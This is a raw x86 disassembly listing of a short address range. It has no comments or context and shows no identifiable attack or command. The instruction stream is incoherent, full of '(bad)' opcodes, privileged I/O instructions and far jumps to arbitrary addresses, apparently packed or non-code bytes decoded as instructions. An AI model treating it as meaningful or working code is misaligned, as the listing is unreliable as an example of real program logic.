  4152d4:	xor    esi,DWORD PTR [ebp+0x29]
  4152d7:	lea    ebp,[edx]
  4152d9:	push   ecx
  4152da:	add    esi,DWORD PTR [ebp-0x55]
  4152dd:	push   ebp
  4152de:	retf   
  4152df:	js     0x415266
  4152e1:	outs   dx,BYTE PTR ds:[esi]
  4152e2:	push   edi
  4152e3:	std    
  4152e4:	sbb    BYTE PTR [eax+0xcecb73d],0x17
  4152eb:	sub    edx,ebp
  4152ed:	pop    edi
  4152ee:	call   0x7d0bc1f3
  4152f3:	add    al,0x71
  4152f5:	mov    ebx,0xfcaac550
  4152fa:	sbb    DWORD PTR [eax-0x23],0xffffffa0
  4152fe:	xor    ecx,DWORD PTR [ecx+0x34]
  415301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415302:	cdq    
  415303:	sti    
  415304:	test   al,0xf9
  415306:	inc    edi
  415307:	test   al,0x33
  415309:	xor    edx,DWORD PTR [esi+0x433d159f]
  41530f:	nop
  415310:	icebp  
  415311:	xchg   DWORD PTR [ebx],esp
  415313:	sbb    edx,DWORD PTR [edi+0x33b46ca2]
  415319:	dec    ebx
  41531a:	retf   
  41531b:	lock add BYTE PTR [edx+0x7e1be767],0x30
  415323:	call   0x66fc:0xca538848
  41532a:	xor    edx,ebx
  41532c:	cwde   
  41532d:	mov    dh,0x7e
  41532f:	cmp    DWORD PTR ds:0x32a432bf,edi
  415335:	jb     0x41531c
  415337:	sbb    dl,BYTE PTR [ebx-0x76]
  41533a:	enter  0x8c3c,0xae
  41533e:	arpl   WORD PTR [edi],dx
  415340:	mov    fs,WORD PTR ds:0x70b91694
  415346:	xchg   edi,eax
  415347:	inc    ecx
  415348:	ret    0x161f
  41534b:	fisttp QWORD PTR [esp+edx*4]
  41534e:	push   ss
  41534f:	ficomp DWORD PTR [eax+edx*1+0x35]
  415353:	sub    DWORD PTR [ebx+0x6a],eax
  415356:	add    al,0x91
  415358:	sub    eax,0x3827763f
  41535d:	mov    esp,0xc834091b
  415362:	outs   dx,DWORD PTR ds:[esi]
  415363:	push   cs
  415364:	or     eax,0x69f62ad1
  415369:	sbb    BYTE PTR [edi+eiz*1-0x63eadff5],ch
  415370:	jo     0x415385
  415372:	inc    edx
  415373:	out    0x9f,eax
  415375:	aad    0xf
  415377:	aam    0x60
  415379:	inc    edi
  41537a:	ret    
  41537b:	or     cl,dh
  41537d:	pop    edx
  41537e:	sub    DWORD PTR [esi],edx
  415380:	rcr    edi,cl
  415382:	in     eax,dx
  415383:	fsub   st,st(3)
  415385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415386:	pop    edi
  415387:	in     eax,0xa0
  415389:	fidiv  WORD PTR [ebx+0x2a47c012]
  41538f:	ins    DWORD PTR es:[edi],dx
  415390:	or     edx,DWORD PTR [edx]
  415392:	mov    esi,0x4f1c5b70
  415397:	jae    0x415345
  415399:	fistp  WORD PTR [ebp+0x516e1f07]
  41539f:	fwait
  4153a0:	daa    
  4153a1:	shl    BYTE PTR [edx],cl
  4153a3:	inc    edx
  4153a4:	mov    ebp,DWORD PTR [esi+0x23]
  4153a7:	dec    ecx
  4153a8:	mov    bh,BYTE PTR [edx+0x444f3d83]
  4153ae:	cdq    
  4153af:	adc    al,0xa7
  4153b1:	xor    ecx,0xfffffffd
  4153b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b5:	adc    ch,BYTE PTR [ebp-0x588c2818]
  4153bb:	jp     0x4153ea
  4153bd:	jecxz  0x415427
  4153bf:	les    edi,FWORD PTR [ecx+0x54c43bb6]
  4153c5:	cmp    eax,0x3490075c
  4153ca:	sub    BYTE PTR [esi-0xf],dh
  4153cd:	xor    BYTE PTR [edx+0x4f7a525e],bl
  4153d3:	push   esi
  4153d4:	int    0x4d
  4153d6:	dec    edi
  4153d7:	loope  0x41535d
  4153d9:	push   ebp
  4153da:	loop   0x41540d
  4153dc:	jmp    0x30c85a6b
  4153e1:	pop    ds
  4153e2:	aas    
  4153e3:	xlat   BYTE PTR ds:[ebx]
  4153e4:	fcomi  st,st(3)
  4153e6:	in     eax,0xa4
  4153e8:	cld    
  4153e9:	imul   eax,DWORD PTR [edx-0x57fbb2ee],0xffffff9e
  4153f0:	into   
  4153f1:	cld    
  4153f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f3:	pop    ss
  4153f4:	leave  
  4153f5:	scas   al,BYTE PTR es:[edi]
  4153f6:	or     esi,edx
  4153f8:	js     0x415408
  4153fa:	pop    ecx
  4153fb:	pop    edx
  4153fc:	pop    ss
  4153fd:	in     al,dx
  4153fe:	xlat   BYTE PTR ds:[ebx]
  4153ff:	or     esp,esp
  415401:	in     al,dx
  415402:	scas   al,BYTE PTR es:[edi]
  415403:	sub    edx,DWORD PTR [ecx-0x4615d808]
  415409:	fs (bad) 
  41540b:	popf   
  41540c:	enter  0x536b,0x46
  415410:	pusha  
  415411:	imul   esp,ebx,0xc3de4219
  415417:	dec    ecx
  415418:	loopne 0x4153de
  41541a:	xchg   BYTE PTR [esi-0x7bae0594],bh
  415420:	jp     0x415449
  415422:	test   BYTE PTR [ebx+edi*1+0x77b2863a],dh
  415429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41542a:	and    al,0x84
  41542c:	sbb    eax,0x79e49073
  415431:	std    
  415432:	pop    ss
  415433:	in     al,0xd0
  415435:	mov    edx,0xa20d225d
  41543a:	mov    ah,0x8e
  41543c:	mov    eax,0xed3037a
  415441:	or     al,0x96
  415443:	xchg   esi,eax
  415444:	mov    bl,dl
  415446:	bound  esp,QWORD PTR [ecx+0x5b]
  415449:	sbb    edx,edx
  41544b:	cmc    
  41544c:	inc    ebx
  41544d:	fadd   DWORD PTR [ecx-0x46d63136]
  415453:	js     0x4154bd
  415455:	sub    BYTE PTR [edi],0xee
  415458:	ret    0x7aeb
  41545b:	icebp  
  41545c:	sub    ch,BYTE PTR [ebx+0x61]
  41545f:	pop    ebp
  415460:	adc    al,0xca
  415462:	mov    eax,ds:0xf2f9b724
  415467:	jmp    0x41546c
  415469:	inc    ebx
  41546a:	and    BYTE PTR [ecx-0x1c623271],al
  415470:	fild   DWORD PTR [edi-0x3c]
  415473:	stos   DWORD PTR es:[edi],eax
  415474:	sbb    al,0x41
  415476:	fcomp  DWORD PTR [eax-0x2f0753ea]
  41547c:	or     dh,ch
  41547e:	and    BYTE PTR [ebp-0x4e],al
  415481:	xor    al,0xdb
  415483:	mov    bl,0x49
  415485:	test   esp,ebp
  415487:	sete   dh
  41548a:	pop    esp
  41548b:	adc    al,0xe0
  41548d:	cdq    
  41548e:	dec    ebx
  41548f:	retf   
  415490:	push   ebx
  415491:	sti    
  415492:	jl     0x41548a
  415494:	popf   
  415495:	call   0x2a6d:0xdadf5d0
  41549c:	add    BYTE PTR [edi],cl
  41549e:	in     al,0xbc
  4154a0:	stos   BYTE PTR es:[edi],al
  4154a1:	bound  ebp,QWORD PTR [edi]
  4154a3:	cmp    eax,0xa7282da9
  4154a8:	pop    edi
  4154a9:	cmp    al,BYTE PTR [eax]
  4154ab:	test   eax,0xcb0c4255
  4154b0:	push   bx
  4154b2:	fst    QWORD PTR [ebx]
  4154b4:	mov    cl,0x70
  4154b6:	in     al,0x1b
  4154b8:	push   ecx
  4154b9:	ja     0x415449
  4154bb:	push   ecx
  4154bc:	sub    ebp,ebp
  4154be:	pop    esi
  4154bf:	les    esi,FWORD PTR [edx+0x6a0285a4]
  4154c5:	xor    BYTE PTR [edi],bh
  4154c7:	aaa    
  4154c8:	mov    esi,ecx
  4154ca:	xchg   edi,eax
  4154cb:	sbb    BYTE PTR [ebp+0x4c],cl
  4154ce:	call   0x9c720201
  4154d3:	aad    0x38
  4154d5:	cmp    eax,0x23affd02
  4154da:	jle    0x4154ab
  4154dc:	sbb    eax,0x41597e86
  4154e1:	or     esi,DWORD PTR [eax]
  4154e3:	(bad)  
  4154e4:	pop    edx
  4154e5:	scas   al,BYTE PTR es:[edi]
  4154e6:	mov    esp,0xe0363612
  4154eb:	cld    
  4154ec:	fmul   QWORD PTR [ecx-0x5a]
  4154ef:	pop    ebp
  4154f0:	outs   dx,BYTE PTR ds:[esi]
  4154f1:	push   0x10f9770e
  4154f6:	inc    edx
  4154f7:	ds xchg ebx,eax
  4154f9:	mov    al,0xe0
  4154fb:	stc    
  4154fc:	xor    DWORD PTR [esi],ebx
  4154fe:	mov    ch,0xff
  415500:	pop    ecx
  415501:	adc    dl,BYTE PTR [ebp-0x30]
  415504:	add    bl,BYTE PTR ds:0xc50e0fa2
  41550a:	and    dl,BYTE PTR [ebx-0x25]
  41550d:	sbb    cl,BYTE PTR [edi+esi*1]
  415510:	pop    es
  415511:	shl    BYTE PTR [esi+0x7cb331fd],0xba
  415518:	dec    edi
  415519:	adc    ch,BYTE PTR [eax+0x6d]
  41551c:	das    
  41551d:	not    BYTE PTR [edi-0x6a4227cc]
  415523:	and    esi,esi
  415525:	xchg   edi,eax
  415526:	adc    BYTE PTR [esi],dh
  415528:	jecxz  0x415518
  41552a:	mov    edx,0xfcb286b2
  41552f:	sbb    eax,0xceeca739
  415534:	xchg   ecx,eax
  415535:	mov    ds:0xf3176f55,al
  41553a:	jmp    0x146f26d3
  41553f:	in     al,0xad
  415541:	sbb    bh,BYTE PTR ss:[bp-0xc]
  415546:	jecxz  0x415568
  415548:	iret   
  415549:	or     edx,ebp
  41554b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41554c:	mov    ch,0xfb
  41554e:	sbb    ch,BYTE PTR [esi+edi*2]
  415551:	ret    
  415552:	mov    ds:0x2eba2dc9,eax
  415557:	iret   
  415558:	aam    0xe3
  41555a:	cmp    ah,BYTE PTR [eax+0x533d7427]
  415560:	jns    0x415581
  415562:	mov    esi,ebx
  415564:	mov    ah,0x6f
  415566:	mov    ebx,0x31d858df
  41556b:	dec    edx
  41556c:	adc    BYTE PTR [edi],bh
  41556e:	sub    esi,DWORD PTR [ecx]
  415570:	aam    0xa9
  415572:	mov    ch,0x3f
  415574:	mov    dh,0x66
  415576:	inc    esp
  415577:	cmc    
  415578:	adc    esi,DWORD PTR [esi+ebp*2]
  41557b:	call   0x71fc:0x79de385f
  415582:	or     al,0xfa
  415584:	ds (bad) 
  415586:	fsubp  st(2),st
  415588:	pop    ss
  415589:	sub    eax,0xed29ce14
  41558e:	test   BYTE PTR [edx],dl
  415590:	fld    DWORD PTR [esi]
  415592:	ins    DWORD PTR es:[edi],dx
  415593:	test   BYTE PTR [edi+0x7c],al
  415596:	dec    eax
  415597:	xchg   bh,al
  415599:	stos   BYTE PTR es:[edi],al
  41559a:	adc    eax,0x1339e697
  41559f:	sub    DWORD PTR [edx+0x79],ebx
  4155a2:	dec    eax
  4155a3:	test   al,0x99
  4155a5:	div    cl
  4155a7:	fsubr  DWORD PTR [ebx-0x22]
  4155aa:	outs   dx,BYTE PTR ds:[esi]
  4155ab:	sub    al,0x4c
  4155ad:	push   es
  4155ae:	pusha  
  4155af:	mov    cl,0x80
  4155b1:	in     al,0x90
  4155b3:	mov    ch,0xcd
  4155b5:	pop    ebp
  4155b6:	stc    
  4155b7:	call   0x4a7b29a
  4155bc:	push   edi
  4155bd:	sbb    BYTE PTR [edx],bh
  4155bf:	inc    edx
  4155c0:	xchg   edi,eax
  4155c1:	cdq    
  4155c2:	pop    ds
  4155c3:	push   0xfffffff9
  4155c5:	ret    0x235d
  4155c8:	sbb    al,0x88
  4155ca:	pop    ecx
  4155cb:	or     eax,0x20643553
  4155d0:	add    eax,0x8d1fed85
  4155d5:	cmp    BYTE PTR [esi-0x771f521a],0x7f
  4155dc:	and    al,dl
  4155de:	xor    al,0xd2
  4155e0:	in     al,0xb7
  4155e2:	jle    0x415608
  4155e4:	ds (bad) 
  4155e6:	call   0x3e85:0x745c5619
  4155ed:	(bad)  
  4155ee:	jmp    0x415633
  4155f0:	sti    
  4155f1:	pusha  
  4155f2:	push   ebp
  4155f3:	(bad)  
  4155f4:	aaa    
  4155f5:	and    DWORD PTR [ecx+0x1f],ebx
  4155f8:	test   eax,0xcdfe0a4d
  4155fd:	lods   al,BYTE PTR ds:[esi]
  4155fe:	cwde   
  4155ff:	adc    BYTE PTR [edx-0x436ddf8f],ch
  415605:	xchg   ecx,eax
  415606:	dec    esi
  415607:	adc    dh,0xfb
  41560a:	mov    ss,WORD PTR [edi+0x6ce0238a]
  415610:	fucomi st,st(7)
  415612:	cli    
  415613:	fld    TBYTE PTR [ecx]
  415615:	mov    al,0xf2
  415617:	jge    0x415656
  415619:	loop   0x4155c4
  41561b:	xor    al,0x53
  41561d:	xchg   ebx,eax
  41561e:	(bad)  
  41561f:	jg     0x415659
  415621:	sub    DWORD PTR [eax],esi
  415623:	std    
  415624:	imul   ebp,DWORD PTR [edx+0x34],0xffffff8e
  415628:	mov    ecx,0xce40ae8b
  41562d:	or     al,0xd
  41562f:	nop
  415630:	and    al,0x35
  415632:	cmp    eax,0xbf836c1f
  415637:	fistp  WORD PTR [esi+0x43]
  41563a:	push   esi
  41563b:	mov    dh,0xd3
  41563d:	fwait
  41563e:	rcr    DWORD PTR [edx+0x47],1
  415641:	rcl    DWORD PTR [edx],1
  415643:	cli    
  415644:	popf   
  415645:	popa   
  415646:	rcr    esp,cl
  415648:	iret   
  415649:	cmp    esp,edx
  41564b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41564c:	jbe    0x4156c1
  41564e:	pop    ss
  41564f:	inc    edi
  415650:	popa   
  415651:	jno    0x415625
  415653:	inc    eax
  415654:	lahf   
  415655:	pop    edx
  415656:	arpl   WORD PTR [eax],cx
  415658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415659:	and    eax,eax
  41565b:	loopne 0x41561b
  41565d:	stos   BYTE PTR es:[edi],al
  41565e:	je     0x4155ee
  415660:	mov    dh,BYTE PTR [ebp-0x34]
  415663:	ror    BYTE PTR [ebp+eiz*1+0x3081d300],0xfd
  41566b:	xchg   DWORD PTR [eax],ebp
  41566d:	push   eax
  41566e:	mov    ah,0x54
  415670:	sahf   
  415671:	out    dx,eax
  415672:	mov    esi,0xb4ad9b94
  415677:	inc    eax
  415678:	inc    esp
  415679:	sahf   
  41567a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41567b:	sub    DWORD PTR [esi],esp
  41567d:	mov    ds:0x9b270d93,eax
  415682:	mov    esp,0x1c8797dc
  415687:	and    edi,esp
  415689:	xor    ebx,DWORD PTR [ebx]
  41568b:	jle    0x4156ea
  41568d:	pop    eax
  41568e:	and    DWORD PTR [edx],esi
  415690:	cmp    bl,ah
  415692:	xor    DWORD PTR [ebx-0x16c7bd8],esi
  415698:	ins    BYTE PTR es:[edi],dx
  415699:	xor    cl,BYTE PTR [ecx+0x38f3f2ff]
  41569f:	push   edx
  4156a0:	ss or  eax,0xcb8799f7
  4156a6:	push   cs
  4156a7:	fs leave 
  4156a9:	push   0x391b8e12
  4156ae:	xchg   ebx,eax
  4156af:	add    bh,BYTE PTR [ebp+0x61]
  4156b2:	call   0x61065926
  4156b7:	rol    BYTE PTR [ecx+0x311cf2d8],1
  4156bd:	imul   ecx,ebp,0xe35c0949
  4156c3:	mov    al,0xdc
  4156c5:	sahf   
  4156c6:	dec    esi
  4156c7:	pop    ebp
  4156c8:	loope  0x415710
  4156ca:	ret    0xf6f0
  4156cd:	sub    dl,BYTE PTR [ecx+0x27]
  4156d0:	inc    esp
  4156d1:	call   0x17e9ca9c
  4156d6:	icebp  
  4156d7:	lock add BYTE PTR [eax+0x55],ch
  4156db:	mov    ebp,DWORD PTR [eax]
  4156dd:	js     0x4156c4
  4156df:	sub    al,0x98
  4156e1:	iret   
  4156e2:	ret    0x37c9
  4156e5:	inc    ecx
  4156e6:	adc    eax,0x104573e6
  4156eb:	data16 fidivr DWORD PTR [edi-0x1ce6a5b3]
  4156f2:	sub    esi,ecx
  4156f4:	jne    0x4156d3
  4156f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156f7:	xchg   BYTE PTR [edx-0x51],ah
  4156fa:	xchg   esi,eax
  4156fb:	cmp    ecx,DWORD PTR [esi-0x81dd731]
  415701:	js     0x4156fb
  415703:	pop    ebp
  415704:	pop    edx
  415705:	push   ebx
  415706:	ins    DWORD PTR es:[edi],dx
  415707:	sub    ch,cl
  415709:	arpl   WORD PTR [ecx-0x7c9cb826],di
  41570f:	push   cs
  415710:	jmp    0x5b59:0x1f2e9ff5
  415717:	mov    dh,0x9b
  415719:	pop    es
  41571a:	out    dx,eax
  41571b:	cmp    ecx,DWORD PTR [ebx]
  41571d:	pop    ebp
  41571e:	add    dh,dh
  415720:	sahf   
  415721:	icebp  
  415722:	pop    edi
  415723:	and    al,0x8a
  415725:	stos   BYTE PTR es:[edi],al
  415726:	and    eax,0x8e8c22a3
  41572b:	cdq    
  41572c:	add    ebx,DWORD PTR [esi+0x5e]
  41572f:	and    al,0x37
  415731:	int3   
  415732:	inc    edi
  415733:	or     eax,0xbffa4027
  415739:	xchg   DWORD PTR [esi+0x2e82fbfc],esp
  41573f:	ret    
  415740:	xor    BYTE PTR [edx-0x64aaa3bb],al
  415746:	dec    edx
  415747:	lds    edi,FWORD PTR [edx+0x90c5f3e]
  41574d:	jge    0x4157a2
  41574f:	out    0x89,al
  415751:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415752:	hlt    
  415753:	fmul   QWORD PTR [ebp+0x76]
  415756:	rcr    DWORD PTR [eax+edi*8-0x42344213],cl
  41575d:	jmp    0x7729d7b5
  415762:	push   edx
  415763:	sahf   
  415764:	sub    eax,0xaa231cfc
  415769:	ja     0x4157d7
  41576b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41576c:	sub    DWORD PTR [eax+esi*8+0x76d9822],0xffffff94
  415774:	adc    al,0xda
  415776:	fild   DWORD PTR [edx+0x39846c9c]
  41577c:	mov    ah,BYTE PTR [eax+edx*2]
  41577f:	jb     0x415728
  415781:	cdq    
  415782:	(bad)  
  415784:	stos   DWORD PTR es:[edi],eax
  415785:	retf   
  415786:	push   edi
  415787:	popf   
  415788:	xor    DWORD PTR [eax],esi
  41578a:	push   edx
  41578b:	xor    BYTE PTR [eax+edi*8-0x75],cl
  41578f:	in     eax,dx
  415790:	mov    esp,DWORD PTR [eax+0x11f8160b]
  415796:	cmp    DWORD PTR [ebx-0x4cabf453],ebx
  41579c:	int3   
  41579d:	cmp    eax,DWORD PTR [ebp-0x59a92caa]
  4157a3:	xlat   BYTE PTR ds:[ebx]
  4157a4:	rcl    DWORD PTR [eax-0xd7fb53e],0x3c
  4157ab:	scas   eax,DWORD PTR es:[edi]
  4157ac:	cli    
  4157ad:	loop   0x415748
  4157af:	inc    eax
  4157b0:	fcmovne st,st(7)
  4157b2:	xor    BYTE PTR [esi+0x50],ch
  4157b5:	cmp    al,0xcd
  4157b7:	fwait
  4157b8:	mov    edi,0x4cc546b6
  4157bd:	lods   eax,DWORD PTR ds:[esi]
  4157be:	repnz sbb DWORD PTR [esi-0x47],0xffffff91
  4157c3:	rcl    DWORD PTR [ecx+0x6e],cl
  4157c6:	ja     0x415832
  4157c8:	std    
  4157c9:	mov    BYTE PTR gs:[esi+ecx*2-0x51f385c],dl
  4157d1:	push   ds
  4157d2:	stos   DWORD PTR es:[edi],eax
  4157d3:	(bad)  
  4157d4:	cmp    al,0x33
  4157d6:	mov    al,ds:0xdb971df2
  4157db:	test   eax,0x467cc589
  4157e0:	dec    ecx
  4157e1:	xor    al,0x6b
  4157e3:	mov    fs,WORD PTR [ebx+0x6db7adcc]
  4157e9:	add    eax,0x8388e6f1
  4157ee:	shl    BYTE PTR [eax-0x54],1
  4157f1:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4157f3:	out    0xde,al
  4157f5:	xor    DWORD PTR es:[edi+0x10ba81f3],eax
  4157fc:	or     eax,0x1dd295a7
  415801:	xchg   ecx,eax
  415802:	xchg   esp,eax
  415803:	repz adc esp,DWORD PTR [edx+0x6a]
  415807:	test   al,0x11
  415809:	xchg   esp,eax
  41580a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41580b:	cli    
  41580c:	jmp    0x5fbd:0x87ca597e
  415813:	adc    DWORD PTR [ecx+0x43],esp
  415816:	dec    ecx
  415817:	scas   eax,DWORD PTR es:[edi]
  415818:	pop    esi
  415819:	rcl    BYTE PTR [ecx+0x272ed3fa],cl
  41581f:	not    BYTE PTR [ebx]
  415821:	jecxz  0x4157ec
  415823:	sbb    eax,0x9642ee8a
  415828:	jmp    0x75afe3eb
  41582d:	out    0x71,eax
  41582f:	mov    edx,0xee957ab
  415834:	or     al,0x3e
  415836:	xchg   bp,ax
  415838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415839:	fld    TBYTE PTR [edx]
  41583b:	outs   dx,BYTE PTR ds:[si]
  41583d:	sub    al,0xf0
  41583f:	jae    0x4157d0
  415841:	xlat   BYTE PTR ds:[ebx]
  415842:	ss loopne 0x415866
  415845:	dec    esp
  415846:	add    ebx,eax
  415848:	cld    
  415849:	retf   0x6373
  41584c:	jbe    0x4157dc
  41584e:	xchg   ebp,eax
  41584f:	push   cs
  415850:	(bad)  
  415851:	xchg   ebp,eax
  415852:	push   ebp
  415853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415854:	dec    eax
  415855:	mov    ds:0x9bb42bba,al
  41585a:	sbb    bh,BYTE PTR [edi+0x4bad6eee]
  415860:	fwait
  415861:	shl    ebx,1
  415863:	shl    BYTE PTR [edi+edx*4-0x1f45e19e],1
  41586a:	scas   eax,DWORD PTR es:[edi]
  41586b:	mov    edi,0xd745c262
  415870:	sbb    ecx,DWORD PTR [ebx+esi*8+0x7e2925a5]
  415877:	dec    eax
  415878:	test   DWORD PTR [edx-0x56962ca2],esi
  41587e:	sub    eax,ebp
  415880:	ins    BYTE PTR es:[edi],dx
  415881:	cmp    dl,BYTE PTR [edx+0x6f]
  415884:	push   cs
  415885:	jno    0x4158a2
  415887:	cli    
  415888:	dec    esi
  415889:	pop    esp
  41588a:	dec    esi
  41588b:	inc    eax
  41588c:	sub    DWORD PTR ds:0xc4c95f5e,esi
  415892:	mov    dl,BYTE PTR [edi]
  415894:	in     al,dx
  415895:	push   edi
  415896:	iret   
  415897:	fdiv   QWORD PTR [eax+0xb51460c]
  41589d:	sahf   
  41589e:	fcompp 
  4158a0:	mov    esi,0x32a7784c
  4158a5:	adc    BYTE PTR [esi],dl
  4158a7:	gs (bad) 
  4158a9:	mov    WORD PTR [edx-0x61],fs
  4158ac:	(bad)  
  4158ad:	pusha  
  4158ae:	pop    edx
  4158af:	adc    eax,0xcced6078
  4158b4:	mov    ebp,0x90ad1680
  4158b9:	jmp    0x828b:0xbdf213c9
  4158c0:	in     eax,0x9e
  4158c2:	or     eax,0x908de07d
  4158c7:	into   
  4158c8:	xchg   esp,eax
  4158c9:	xor    al,0x58
  4158cb:	ficom  DWORD PTR [edx+ecx*8-0x7f]
  4158cf:	outs   dx,BYTE PTR ds:[esi]
  4158d0:	xchg   ecx,eax
  4158d1:	nop
  4158d2:	mov    al,0xb0
  4158d4:	stos   BYTE PTR es:[edi],al
  4158d5:	dec    esp
  4158d6:	cmp    dh,BYTE PTR [esi-0x3a9f53b7]
  4158dc:	test   al,0xad
  4158de:	inc    esi
  4158df:	shl    BYTE PTR [ebp-0x28dfef1f],0xe1
  4158e6:	add    eax,0x51f276a7
  4158eb:	adc    al,0x96
  4158ed:	add    DWORD PTR [edi],ebx
  4158ef:	loopne 0x41589d
  4158f1:	in     al,dx
  4158f2:	jle    0x41593b
  4158f4:	xor    ch,ah
  4158f6:	dec    edi
  4158f7:	popa   
  4158f8:	push   cs
  4158f9:	and    eax,ecx
  4158fb:	out    dx,al
  4158fc:	sbb    DWORD PTR [esi-0xb1e5c41],ebx
  415902:	jmp    DWORD PTR [edi+0x3d375af6]
  415909:	mov    bh,0x64
  41590b:	sub    BYTE PTR [esp+eiz*8+0x2c1645e4],ch
  415912:	mov    bl,0xe
  415915:	cmp    edi,ecx
  415917:	call   0x2bed:0x52ecf6bb
  41591e:	jmp    0x9f95deb9
  415923:	dec    esi
  415924:	stc    
  415925:	icebp  
  415926:	xchg   ecx,eax
  415927:	sbb    BYTE PTR [ebp+0x4b],dh
  41592a:	xchg   edx,eax
  41592b:	imul   ebx,esp,0x8f2dab17
  415931:	fldpi  
  415933:	jns    0x4158d5
  415935:	push   eax
  415936:	inc    ebx
  415937:	and    al,0x4d
  415939:	cmc    
  41593a:	sbb    DWORD PTR [ecx-0x30d7cc08],0x8a25a957
  415944:	in     al,dx
  415945:	pop    esp
  415946:	sbb    DWORD PTR [ebp-0x27],edi
  415949:	jg     0x415940
  41594b:	rol    DWORD PTR [edi-0x47f848d3],1
  415951:	sbb    BYTE PTR [ebx-0x10],dh
  415954:	cli    
  415955:	jp     0x41595c
  415957:	lea    esp,[esi+0x4d]
  41595a:	adc    bl,dh
  41595c:	jns    0x415990
  41595e:	xchg   ebp,eax
  41595f:	jecxz  0x415924
  415961:	pop    ebx
  415962:	lods   al,BYTE PTR ds:[esi]
  415963:	xchg   edx,eax
  415964:	(bad)  
  415965:	pop    edi
  415966:	stc    
  415967:	aad    0x3e
  415969:	adc    al,0x3d
  41596b:	mov    ds:0xb55b0a04,al
  415970:	scas   al,BYTE PTR es:[edi]
  415971:	jb     0x415989
  415973:	fwait
  415974:	lods   eax,DWORD PTR ds:[esi]
  415975:	cmp    eax,0xc7ce644
  41597a:	dec    ecx
  41597b:	jnp    0x4159e7
  41597d:	arpl   bx,ax
  41597f:	fsubp  st(0),st
  415981:	out    0x35,al
  415983:	ins    BYTE PTR es:[edi],dx
  415984:	pop    edx
  415985:	pop    es
  415986:	cdq    
  415987:	mov    dh,0xcc
  415989:	mov    ah,BYTE PTR [ecx+0x2a]
  41598c:	(bad)  
  41598d:	push   edi
  41598e:	xor    ecx,DWORD PTR [esi-0x18]
  415991:	ret    
  415992:	add    eax,0x2833b7e6
  415997:	cs jne 0x415978
  41599a:	fs jmp 0x37ac:0xf3f54b58
  4159a2:	gs push ebp
  4159a4:	sub    eax,0x1a2ae037
  4159a9:	pop    esp
  4159aa:	add    eax,0x7b3eff89
  4159af:	mov    ebp,0x945f80b4
  4159b4:	fwait
  4159b5:	aaa    
  4159b6:	xchg   ebx,eax
  4159b7:	sar    ch,1
  4159b9:	mov    ecx,0x9c76e224
  4159be:	ror    ebp,cl
  4159c0:	stc    
  4159c1:	test   BYTE PTR [ecx-0x17],0xd6
  4159c5:	psllq  mm0,QWORD PTR [ebx+0x15505664]
  4159cc:	jp     0x415a1f
  4159ce:	sbb    ebx,ebp
  4159d0:	jmp    0x41598b
  4159d2:	rol    BYTE PTR [edx],1
  4159d4:	stc    
  4159d5:	jbe    0x415a20
  4159d7:	mov    WORD PTR [esi-0x6c],ss
  4159da:	push   ss
  4159db:	jge    0x4159a8
  4159dd:	test   eax,0x5d3cfd6e
  4159e2:	(bad)  
  4159e3:	cli    
  4159e4:	jmp    0x56b8:0x727633e5
  4159eb:	cmp    DWORD PTR es:[eax+eiz*4-0x27a991a7],ebx
  4159f3:	dec    edx
  4159f4:	rol    DWORD PTR [eax],cl
  4159f6:	push   es
  4159f7:	(bad)  
  4159f8:	fidivr DWORD PTR [esi-0x75]
  4159fb:	iret   
  4159fc:	(bad)  
  4159fd:	cmc    
  4159fe:	add    ch,0xf1
  415a01:	adc    al,0x3f
  415a03:	daa    
  415a04:	stos   BYTE PTR es:[edi],al
  415a05:	pusha  
  415a06:	or     eax,0xc02a9c97
  415a0b:	rcr    DWORD PTR [edi+0x74],1
  415a0e:	les    esp,FWORD PTR cs:[edi+ecx*2-0x67d5d979]
  415a16:	jecxz  0x415a60
  415a18:	cs (bad) 
  415a1b:	sbb    DWORD PTR [edi],eax
  415a1d:	pop    eax
  415a1e:	or     al,0x85
  415a20:	out    0xdb,eax
  415a22:	or     ah,BYTE PTR [ecx+0x30]
  415a25:	(bad)  
  415a26:	fnstsw WORD PTR [edi]
  415a28:	push   ebx
  415a29:	stos   BYTE PTR es:[edi],al
  415a2a:	adc    eax,0x39eb79f5
  415a2f:	icebp  
  415a30:	stos   BYTE PTR es:[edi],al
  415a31:	mov    bh,0x96
  415a33:	and    esp,DWORD PTR [eax+edi*8+0x5b10e2a]
  415a3a:	sub    DWORD PTR [edi+esi*2-0x2daee1a],0xffffffdc
  415a42:	adc    ah,BYTE PTR [edx+edi*4+0x6d]
  415a46:	xor    eax,0xfad91463
  415a4b:	pop    esi
  415a4c:	bound  esp,QWORD PTR [ebx]
  415a4e:	loopne 0x415aaa
  415a50:	jle    0x4159e4
  415a52:	call   0x346c2a87
  415a57:	std    
  415a58:	push   es
  415a59:	jp     0x415a20
  415a5b:	(bad)  
  415a5c:	jge    0x4159eb
  415a5e:	jns    0x415ac6
  415a60:	pop    esp
  415a61:	inc    edi
  415a62:	stc    
  415a63:	inc    esi
  415a64:	inc    ebx
  415a65:	retf   
  415a66:	xchg   ebx,eax
  415a67:	ins    BYTE PTR es:[edi],dx
  415a68:	divps  xmm0,xmm2
  415a6b:	xchg   esi,eax
  415a6c:	xchg   ebx,eax
  415a6d:	lock and DWORD PTR [esi-0x17],edi
  415a71:	outs   dx,DWORD PTR cs:[esi]
  415a73:	dec    ecx
  415a74:	test   al,0xaa
  415a76:	jmp    0x415ad9
  415a78:	shr    BYTE PTR [ebx],1
  415a7a:	jmp    0x4d2d:0xdb085b77
  415a81:	jle    0x415ab3
  415a83:	xchg   esi,eax
  415a84:	xor    DWORD PTR [ebp-0x341de9cd],edx
